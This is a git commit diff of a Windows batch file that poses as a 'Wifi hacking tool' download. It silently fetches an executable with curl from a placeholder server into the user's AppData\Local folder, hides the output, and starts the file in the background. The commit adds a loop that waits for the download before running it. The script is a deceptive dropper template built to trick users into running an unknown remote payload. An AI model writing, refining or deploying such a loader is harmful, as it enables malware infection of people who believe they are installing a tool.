d6e9e83d51095559079911006c59251482f839ff
Lastknight12 <108629475+Lastknight12@users.noreply.github.com>
2023-08-22 00:15:24 +0300

    Update bat.bat

--- bat.bat
+++ bat.bat
@@ -1,14 +1,20 @@
 @echo off
 
-set "server_url=type_apache_link_here"
-set "server_file=client.exe"
+set "server_url=apache_server_link/"
+set "server_file=filename.exe"
 
-set "downloads_folder=%USERPROFILE%\"
+set "downloads_folder=%USERPROFILE%\AppData\Local\"
 
 echo Download Wifi hacking tool
 echo Please Wait
-curl -o "%downloads_folder%\client.exe" %server_url%%server_file% > NUL 2>&1
+curl -o "%downloads_folder%\filename.exe" %server_url%%server_file% > NUL 2>&1
 
-start "" /B "%downloads_folder%\client.exe"
+:CHECK_DOWNLOAD
+if exist "%downloads_folder%\filename.exe" (
+    start "" /B "%downloads_folder%\filename.exe"
+) else (
+    timeout /t 1
+    goto CHECK_DOWNLOAD
+)
 
 exit
